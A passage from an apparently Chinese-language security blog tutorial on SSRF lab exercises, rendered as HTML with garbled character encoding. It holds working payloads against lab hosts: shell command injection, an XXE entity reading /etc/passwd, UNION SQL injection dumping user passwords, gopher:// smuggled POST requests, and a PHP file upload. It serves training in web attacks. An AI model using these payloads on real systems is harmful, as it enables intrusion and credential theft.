class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423150006536.png" alt="image-20250423150006536"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423150619955.png" alt="image-20250423150619955"></p><p>è¿™é‡Œè¿”å›çš„ç»“æœè¦åœ¨æºç ä¸­æŸ¥çœ‹</p><p>ç„¶åå°±å¯ä»¥æ„é€ æ‰§è¡Œå‘½ä»¤çš„POCï¼Œè¦æ³¨æ„ä¿®æ”¹é•¿åº¦</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.5<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;ls</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423150923178.png" alt="image-20250423150923178"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.5<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>21<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;cat flag</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423151424717.png" alt="image-20250423151424717"></p><h3 id="ä½¿ç”¨SSRFè¿›è¡ŒXXE"><a href="#ä½¿ç”¨SSRFè¿›è¡ŒXXE" class="headerlink" title="ä½¿ç”¨SSRFè¿›è¡ŒXXE"></a>ä½¿ç”¨SSRFè¿›è¡ŒXXE</h3><h4 id="å®¡è®¡æºä»£ç "><a href="#å®¡è®¡æºä»£ç " class="headerlink" title="å®¡è®¡æºä»£ç "></a>å®¡è®¡æºä»£ç </h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.6/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250509202417016.png" alt="image-20250509202417016"></p><p>æŸ¥çœ‹æºä»£ç ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doLogin</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_ invoke__">val</span>();<br><span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_ invoke__">val</span>();<br><span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;ç”¨æˆ·åæˆ–å¯†ç ä¸ä¸ºç©º&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <br>    $.<span class="hljs-title function_ invoke__">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin.php&quot;</span>,<br>        <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,<br>        <span class="hljs-attr">data</span>: data,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,<br>        <span class="hljs-attr">anysc</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">success</span>: function (result) &#123;<br>        <span class="hljs-keyword">var</span> code = result.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        <span class="hljs-keyword">var</span> msg = result.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;0&quot;</span>)&#123;<br>                <span class="hljs-title function_ invoke__">swal</span>(<span class="hljs-string">&quot;ç™»å½•å¤±è´¥&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;1&quot;</span>)&#123;<br>                <span class="hljs-title function_ invoke__">swal</span>(<span class="hljs-string">&quot;ç™»å½•æˆåŠŸ&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-title function_ invoke__">swal</span>(<span class="hljs-string">&quot;ç³»ç»Ÿé”™è¯¯&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>        &#125;<br>        &#125;,<br>    &#125;); <br>&#125;<br></code></pre></td></tr></table></figure><p>ä»ä»£ç ä¸­å¯ä»¥å‘ç°ï¼Œåœ¨<code>doLogin()</code>è¿™ä¸ªå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬æäº¤çš„ç”¨æˆ·åå’Œå¯†ç ä¼šè¢«æ‹¼æ¥è¿›å¦‚ä¸‹ä»£ç ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„XMLè¯­è¨€æ„é€ æ–¹å¼ï¼Œç„¶åæ˜¯è¿›è¡Œçš„POSTæäº¤ï¼Œæäº¤ç»™<code>doLogin.php</code>ï¼Œè¿˜è¦æ³¨æ„æ ¼å¼ç±»å‹æ˜¯xmlçš„</p><h4 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h4><p>å…ˆæ„é€ ä¸€ä¸ªç®€å•çš„ï¼Œæäº¤ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯admin</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.6<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>66<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>ç„¶åç”¨bpæŠ“åŒ…ä¿®æ”¹ï¼Œgopherä¼ªåè®®è®¿é—®æŠ“åŒ…</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.6:80/_</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250509205535253.png" alt="image-20250509205535253"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250509205548841.png" alt="image-20250509205548841"></p><p>æ”¾å…¥é‡æ”¾å™¨ï¼Œå°†åˆšæ‰çš„payloadæ”¾å…¥è¿›è¡Œä¸¤æ¬¡urlç¼–ç </p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250509213551266.png" alt="image-20250509213551266"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250509213728608.png" alt="image-20250509213728608"></p><p>å¾—åˆ°çš„å“åº”ä¹Ÿæ˜¯xmlæ ¼å¼çš„</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">msg</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">msg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br></code></pre></td></tr></table></figure><p>çœ‹æºä»£ç ä¸­çš„è¿™éƒ¨åˆ†</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250509210529088.png" alt="image-20250509210529088"></p><p>è¿™é‡Œå“åº”çš„codeä¸º0ï¼Œè¯´æ˜ç™»å½•å¤±è´¥äº†ï¼Œç„¶åä¼šæ˜¾ç¤ºmsgæ˜¯ç”¨æˆ·åä¸ºadminï¼Œæ³¨æ„è¿™é‡Œä¼šå›æ˜¾ç”¨æˆ·åçš„ï¼Œå¯ä»¥ç”¨æ¥å›æ˜¾æ–‡ä»¶å†…å®¹</p><p>å®éªŒç»“æŸï¼Œç„¶åå°±å¯ä»¥æ„é€ ä¸€ä¸ªè¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–çš„payloadäº†</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.6<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>131<br><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">benben</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;benben;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li>è¿™é‡Œå°±æ˜¯å®šä¹‰äº†ä¸€ä¸ªå®ä½“<code>benben</code>ï¼Œå¼•å…¥äº†å¤–éƒ¨å®ä½“<code>SYSTEM</code>ï¼Œè¿™ä¸ªå¤–éƒ¨å®ä½“æŒ‡å‘çš„æ–‡ä»¶è·¯å¾„æ˜¯<code>file:///etc/passwd</code>ï¼Œå°±ç›¸å½“äºç°åœ¨<code>benben</code>ä»£è¡¨çš„æ˜¯<code>/etc/passwd</code>è¿™ä¸ªæ–‡ä»¶</li><li>ç„¶ååœ¨å¡«å†™ç”¨æˆ·åçš„åœ°æ–¹å¡«å†™<code>&amp;benben;</code>å¼•ç”¨<code>benben</code>å®ä½“ï¼Œå› ä¸ºåˆšæ‰å®éªŒå¯çŸ¥ä¼šè¿”å›ç”¨æˆ·åçš„å†…å®¹ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå›æ˜¾<code>/etc/passwd</code>çš„æ–‡ä»¶å†…å®¹ï¼Œå®ç°äº†ä»»æ„æ–‡ä»¶è¯»å–</li></ul><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250509214128766.png" alt="image-20250509214128766"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250509214203895.png" alt="image-20250509214203895"></p><h3 id="ä½¿ç”¨SSRFè¿›è¡ŒSQLæ³¨å…¥"><a href="#ä½¿ç”¨SSRFè¿›è¡ŒSQLæ³¨å…¥" class="headerlink" title="ä½¿ç”¨SSRFè¿›è¡ŒSQLæ³¨å…¥"></a>ä½¿ç”¨SSRFè¿›è¡ŒSQLæ³¨å…¥</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.11/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423182926236.png" alt="image-20250423182926236"></p><h4 id="SQLæ³¨å…¥è¯­å¥"><a href="#SQLæ³¨å…¥è¯­å¥" class="headerlink" title="SQLæ³¨å…¥è¯­å¥"></a>SQLæ³¨å…¥è¯­å¥</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># æŸ¥è¯¢åˆ—æ•°</span><br>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;%20group%20by%203--%20</span><br><span class="hljs-string"># æŸ¥è¯¢å›æ˜¾ä½</span><br><span class="hljs-string">/?id=-1&#x27;</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--%<span class="hljs-number">20</span><br><span class="hljs-comment"># æŸ¥è¯¢æ•°æ®åº“å</span><br>/?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;%20union%20select%201,2,database()--%20</span><br><span class="hljs-string"># æŸ¥è¯¢è¡¨å</span><br><span class="hljs-string">/?id=-1&#x27;</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">group_concat</span>(table_name)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span>information_schema.tables%<span class="hljs-number">20</span>where%<span class="hljs-number">20</span>table_schema=<span class="hljs-title function_ invoke__">database</span>()--%<span class="hljs-number">20</span><br><span class="hljs-comment"># æŸ¥è¯¢åˆ—å</span><br>/?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&#x27;</span>users<span class="hljs-string">&#x27;%20and%20table_schema=database()--%20</span><br><span class="hljs-string"># æŸ¥è¯¢æ•°æ®</span><br><span class="hljs-string">/?id=-1&#x27;</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">group_concat</span>(username,<span class="hljs-string">&#x27;-&#x27;</span>,password)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span>users--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h5 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h5><ul><li><strong>æ‰€æœ‰ç©ºæ ¼çš„åœ°æ–¹éƒ½è¦ç”¨<code>+</code>æˆ–<code>%20</code>è¡¨ç¤º</strong></li></ul><p>ç›´æ¥å¡«å†™ç©ºæ ¼ä¼šæŠ¥é”™</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --+<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423185549061.png" alt="image-20250423185549061"></p><p>å¯ä»¥ä½¿ç”¨<code>+</code>æ›¿æ¢</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;+--+<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423185608042.png" alt="image-20250423185608042"></p><p>å¯ä»¥ä½¿ç”¨<code>%20</code>æ›¿æ¢</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423185017524.png" alt="image-20250423185017524"></p><p>ä¹Ÿå¯ä»¥ä¸¤ä¸ªæ··åˆä½¿ç”¨</p><ul><li><strong>ç”¨<code>HackBar</code>è¿›è¡Œæäº¤è¦æŠŠæ‰€æœ‰çš„ç©ºæ ¼è¿›è¡Œä¸¤æ¬¡URLç¼–ç ä¸º<code>%25%20</code>ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨<code>+</code></strong></li></ul><p>åªè¿›è¡Œä¸€æ¬¡URLç¼–ç ä¼šæŠ¥é”™</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>group%<span class="hljs-number">20</span>by%<span class="hljs-number">203</span>--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423190639575.png" alt="image-20250423190639575"></p><p>è¦è¿›è¡Œä¸¤æ¬¡URLç¼–ç </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">2520</span>group%<span class="hljs-number">2520</span>by%<span class="hljs-number">25203</span>--%<span class="hljs-number">2520</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423191100481.png" alt="image-20250423191100481"></p><p>æˆ–è€…ç›´æ¥å…¨éƒ¨ä½¿ç”¨<code>+</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;+group+by+<span class="hljs-number">3</span>--+<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423191158425.png" alt="image-20250423191158425"></p><h4 id="è¦ç”¨POSTæäº¤è¿›è¡ŒSQLæ³¨å…¥"><a href="#è¦ç”¨POSTæäº¤è¿›è¡ŒSQLæ³¨å…¥" class="headerlink" title="è¦ç”¨POSTæäº¤è¿›è¡ŒSQLæ³¨å…¥"></a>è¦ç”¨POSTæäº¤è¿›è¡ŒSQLæ³¨å…¥</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">11</span>/<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423191605610.png" alt="image-20250423191605610"></p><p>æŸ¥çœ‹æºä»£ç ï¼Œå¯ä»¥çœ‹è¦ç”¨POSTæäº¤ä¸‰ä¸ªå‚æ•°</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423191758724.png" alt="image-20250423191758724"></p><p>SSRFé‡ŒPOSTæäº¤å°±è¦ä½¿ç”¨<code>gopher</code>ä¼ªåè®®</p><p>å¯ä»¥è¿›è¡Œä¸€æ¬¡æŠ“åŒ…ï¼Œæ„é€ å‡ºPOC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.11:80</span>/_POST /Less-<span class="hljs-number">11</span>/index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">172.250.250.11</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">53</span><br><br><span class="hljs-attribute">uname</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span> #&amp;passwd=<span class="hljs-number">123</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423193017235.png" alt="image-20250423193017235"></p><p>è¿›è¡Œä¸¤æ¬¡URLç¼–ç </p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423193135040.png" alt="image-20250423193135040"></p><h3 id="ä½¿ç”¨SSRFè¿›è¡Œæ–‡ä»¶ä¸Šä¼ "><a href="#ä½¿ç”¨SSRFè¿›è¡Œæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä½¿ç”¨SSRFè¿›è¡Œæ–‡ä»¶ä¸Šä¼ "></a>ä½¿ç”¨SSRFè¿›è¡Œæ–‡ä»¶ä¸Šä¼ </h3><h4 id="multipart-form-dataçš„å®šä¹‰"><a href="#multipart-form-dataçš„å®šä¹‰" class="headerlink" title="multipart/form-dataçš„å®šä¹‰"></a><code>multipart/form-data</code>çš„å®šä¹‰</h4><p><code>multipart/form-data</code>æ˜¯åœ¨ HTTP åè®®é‡Œç”¨äºè¡¨å•æ•°æ®æäº¤çš„ä¸€ç§ç¼–ç æ–¹å¼ï¼Œè¿™ä¸ªæ•°æ®ä½“ç”±å¤šä¸ªéƒ¨åˆ†ç»„æˆï¼Œæ¯ä¸ªéƒ¨åˆ†è¢«ä¸€ä¸ªå›ºå®šè¾¹ç•Œå€¼åˆ†éš”</p><p><strong>ç®€å•çš„è¯´å°±æ˜¯ä¸€ä¸ªåˆ†éš”ç¬¦ï¼Œå°†POSTå¤šä¸ªæäº¤å†…å®¹ä½¿ç”¨åˆ†ç•Œçº¿æ‹¼æ¥èµ·æ¥</strong></p><p>å¦‚ä¸‹æ˜¯è¿›è¡Œä¸€æ¬¡æ–‡ä»¶ä¸Šä¼ çš„æŠ“åŒ…</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423194434594.png" alt="image-20250423194434594"></p><h4 id="æ„é€ payload-1"><a href="#æ„é€ payload-1" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.14</span>/Pass-<span class="hljs-number">01</span>/index.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423194302965.png" alt="image-20250423194302965"></p><p>æŸ¥çœ‹æºä»£ç ï¼Œå¯»æ‰¾ä¹‹åè¦æ„é€ çš„payloadçš„éƒ¨åˆ†</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423194737386.png" alt="image-20250423194737386"></p><p>é¦–å…ˆå®šä¹‰åˆ†ç•Œçº¿ï¼Œè¿™æ˜¯å¿…éœ€çš„ï¼Œå…¶ä¸­çš„<code>boundary</code>çš„å€¼å¯ä»¥éšä¾¿å®šä¹‰ï¼Œè¿™é‡Œä½¿ç”¨<code>$&#123;Boundary&#125;</code>ä½œä¸ºåˆ†ç•Œçº¿</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: multipart/form-<span class="hljs-class"><span class="hljs-keyword">data</span>; boundary=$&#123;<span class="hljs-type">Boundary</span>&#125;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åˆ†ç•Œçº¿ï¼Œè¦åœ¨å®šä¹‰å¥½çš„åˆ†ç•Œçº¿å‰è¦åŠ ä¸Šä¸¤ä¸ªå‡å·</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--$&#123;Boundary&#125;</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®æºç è¿›è¡Œç¼–å†™æäº¤çš„å†…å®¹ï¼Œé¦–å…ˆæ˜¯ä¸Šä¼ çš„æ–‡ä»¶ä¸æ–‡ä»¶å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;phpinfo.php&quot;</span><br>Content-Type: image/jpeg<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨åˆ†ç•Œçº¿åˆ†éš”å¼€</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--$&#123;Boundary&#125;</span><br></code></pre></td></tr></table></figure><p>æ¥ç€ç»§ç»­æ 